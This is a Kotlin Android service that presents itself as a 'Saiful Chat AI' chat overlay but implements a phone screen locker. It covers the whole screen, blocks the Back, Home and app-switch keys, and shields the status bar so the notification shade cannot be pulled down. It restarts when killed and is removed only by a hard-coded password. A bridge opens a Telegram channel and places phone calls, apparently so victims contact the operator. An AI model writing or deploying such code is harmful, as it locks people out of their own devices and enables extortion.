package com.saiful.chatai

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.KeyEvent
import android.view.MotionEvent
import android.view.View
import android.view.WindowInsets
import android.view.WindowInsetsController
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat

class OverlayChatService : Service() {

    private lateinit var windowManager: WindowManager
    private var overlayContainer: FrameLayout? = null
    private var statusBarShieldView: View? = null
    private var webView: WebView? = null
    private var telegramMiniPopup: View? = null
    private var telegramMiniWebView: WebView? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    companion object {
        private const val CHANNEL_ID = "saiful_chat_overlay_channel"
        private const val NOTIFICATION_ID = 1001
        private const val UNLOCK_PASSWORD = "saiful"
        private const val TELEGRAM_CHANNEL_URL = "https://t.me/s/free1_panel"

        @Volatile
        var isOverlayActive: Boolean = false

        @Volatile
        var allowCallAppTemporarily: Boolean = false

        @Volatile
        private var currentInstance: OverlayChatService? = null

        fun reassertTopFocus() {
            currentInstance?.mainHandler?.post {
                val svc = currentInstance ?: return@post
                val container = svc.overlayContainer ?: return@post
                svc.applyImmersiveFlags(container)
                try {
                    container.requestFocus()
                } catch (_: Exception) {
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        currentInstance = this
        isOverlayActive = true
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        showOverlay()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        isOverlayActive = true
        if (overlayContainer == null) {
            showOverlay()
        }
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Saiful Chat AI Overlay",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Active full-screen chat overlay"
                setShowBadge(false)
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Saiful Chat AI")
            .setContentText("Chat overlay active")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .build()
    }

    private fun getStatusBarHeightPx(): Int {
        val resourceId = resources.getIdentifier("status_bar_height", "dimen", "android")
        val base = if (resourceId > 0) resources.getDimensionPixelSize(resourceId) else 96
        return base + (24 * resources.displayMetrics.density).toInt()
    }

    @SuppressLint("SetJavaScriptEnabled", "ClickableViewAccessibility")
    private fun showOverlay() {
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val container = object : FrameLayout(this) {
            override fun dispatchKeyEvent(event: KeyEvent): Boolean {
                return when (event.keyCode) {
                    KeyEvent.KEYCODE_BACK,
                    KeyEvent.KEYCODE_HOME,
                    KeyEvent.KEYCODE_APP_SWITCH,
                    KeyEvent.KEYCODE_MENU -> true
                    else -> super.dispatchKeyEvent(event)
                }
            }

            override fun onWindowFocusChanged(hasWindowFocus: Boolean) {
                super.onWindowFocusChanged(hasWindowFocus)
                if (!hasWindowFocus && isOverlayActive && !allowCallAppTemporarily) {
                    applyImmersiveFlags(this)
                    OverlayLockAccessibilityService.dismissShadeIfRunning()
                }
            }
        }

        val overlayWebView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            webChromeClient = WebChromeClient()
            webViewClient = WebViewClient()
            addJavascriptInterface(OverlayBridge(), "AndroidOverlay")
            loadUrl("file:///android_asset/overlay_chat.html")
        }

        container.addView(
            overlayWebView,
            FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        )

        val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            layoutType,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }

        windowManager.addView(container, params)
        applyImmersiveFlags(container)

        // Add dedicated top status-bar touch shield to block pull-down swipes inside overlay bounds
        val shield = View(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            setOnTouchListener { _, event ->
                if (event.action == MotionEvent.ACTION_DOWN || event.action == MotionEvent.ACTION_MOVE) {
                    OverlayLockAccessibilityService.dismissShadeIfRunning()
                }
                true
            }
        }
        val shieldParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            getStatusBarHeightPx(),
            layoutType,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
        }

        try {
            windowManager.addView(shield, shieldParams)
            statusBarShieldView = shield
        } catch (_: Exception) {
        }

        overlayContainer = container
        webView = overlayWebView
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun openTelegramMiniWindow() {
        mainHandler.post {
            val container = overlayContainer ?: return@post
            closeTelegramMiniWindowImmediate()

            val dm = resources.displayMetrics
            val popupWidth = (dm.widthPixels * 0.90).toInt()
            val popupHeight = (dm.heightPixels * 0.68).toInt()
            val dp = dm.density

            val wrapper = FrameLayout(this).apply {
                setBackgroundColor(Color.argb(165, 0, 0, 0))
                isClickable = true
            }

            val card = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                background = GradientDrawable().apply {
                    setColor(Color.parseColor("#060A08"))
                    cornerRadius = 16f * dp
                    setStroke((1.5f * dp).toInt(), Color.parseColor("#22D3EE"))
                }
                clipToOutline = true
            }

            val topBar = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER_VERTICAL
                setBackgroundColor(Color.parseColor("#0B1310"))
                setPadding((12 * dp).toInt(), (8 * dp).toInt(), (8 * dp).toInt(), (8 * dp).toInt())
            }

            val titleView = TextView(this).apply {
                text = "Telegram · @free1_panel"
                setTextColor(Color.parseColor("#67E8F9"))
                textSize = 13f
                typeface = Typeface.MONOSPACE
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            }

            val closeBtn = Button(this).apply {
                text = "✕"
                setTextColor(Color.parseColor("#FECACA"))
                textSize = 14f
                typeface = Typeface.MONOSPACE
                background = GradientDrawable().apply {
                    setColor(Color.parseColor("#7F1D1D"))
                    cornerRadius = 8f * dp
                }
                val btnSize = (36 * dp).toInt()
                layoutParams = LinearLayout.LayoutParams(btnSize, btnSize)
                setPadding(0, 0, 0, 0)
                setOnClickListener {
                    closeTelegramMiniWindowImmediate()
                }
            }

            topBar.addView(titleView)
            topBar.addView(closeBtn)

            val miniWebView = WebView(this).apply {
                settings.javaScriptEnabled = true
                settings.domStorageEnabled = true
                webChromeClient = WebChromeClient()
                webViewClient = object : WebViewClient() {
                    override fun shouldOverrideUrlLoading(
                        view: WebView?,
                        request: WebResourceRequest?
                    ): Boolean {
                        val url = request?.url?.toString() ?: return false
                        return !(url.startsWith("https://t.me/") || url.startsWith("http://t.me/"))
                    }
                }
                loadUrl(TELEGRAM_CHANNEL_URL)
            }

            card.addView(topBar)
            card.addView(
                miniWebView,
                LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    0,
                    1f
                )
            )

            val cardParams = FrameLayout.LayoutParams(popupWidth, popupHeight).apply {
                gravity = Gravity.CENTER
            }
            wrapper.addView(card, cardParams)
            container.addView(
                wrapper,
                FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT,
                    FrameLayout.LayoutParams.MATCH_PARENT
                )
            )

            telegramMiniPopup = wrapper
            telegramMiniWebView = miniWebView
        }
    }

    private fun closeTelegramMiniWindowImmediate() {
        try {
            telegramMiniWebView?.destroy()
            telegramMiniWebView = null
            telegramMiniPopup?.let { popup ->
                overlayContainer?.removeView(popup)
            }
            telegramMiniPopup = null
        } catch (_: Exception) {
        }
    }

    @Suppress("DEPRECATION")
    private fun applyImmersiveFlags(view: View) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            view.windowInsetsController?.let { controller ->
                controller.hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
                controller.systemBarsBehavior =
                    WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            }
        } else {
            view.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                    or View.SYSTEM_UI_FLAG_FULLSCREEN
                    or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                )
        }
    }

    private fun removeOverlayAndStop() {
        isOverlayActive = false
        allowCallAppTemporarily = false
        mainHandler.post {
            closeTelegramMiniWindowImmediate()
            try {
                statusBarShieldView?.let { shield ->
                    windowManager.removeView(shield)
                }
                statusBarShieldView = null
            } catch (_: Exception) {
            }
            try {
                webView?.destroy()
                webView = null
                overlayContainer?.let { view ->
                    windowManager.removeView(view)
                }
                overlayContainer = null
            } catch (_: Exception) {
            }
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    override fun onDestroy() {
        isOverlayActive = false
        if (currentInstance == this) {
            currentInstance = null
        }
        closeTelegramMiniWindowImmediate()
        try {
            statusBarShieldView?.let { windowManager.removeView(it) }
        } catch (_: Exception) {
        }
        try {
            webView?.destroy()
            overlayContainer?.let { windowManager.removeView(it) }
        } catch (_: Exception) {
        }
        super.onDestroy()
    }

    inner class OverlayBridge {
        @JavascriptInterface
        fun unlockWithPassword(password: String): Boolean {
            val isMatch = password.trim().equals(UNLOCK_PASSWORD, ignoreCase = true)
            if (isMatch) {
                removeOverlayAndStop()
            }
            return isMatch
        }

        @JavascriptInterface
        fun openTelegramMini() {
            openTelegramMiniWindow()
        }

        @JavascriptInterface
        fun placeCall(phoneNumber: String) {
            val clean = phoneNumber.trim()
            if (clean.isEmpty()) return
            mainHandler.post {
                allowCallAppTemporarily = true
                mainHandler.postDelayed({ allowCallAppTemporarily = false }, 20000L)

                val hasCallPerm = ContextCompat.checkSelfPermission(
                    this@OverlayChatService,
                    Manifest.permission.CALL_PHONE
                ) == PackageManager.PERMISSION_GRANTED

                val action = if (hasCallPerm) Intent.ACTION_CALL else Intent.ACTION_DIAL
                val callIntent = Intent(action, Uri.parse("tel:$clean")).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                try {
                    startActivity(callIntent)
                } catch (_: Exception) {
                }
            }
        }
    }
}
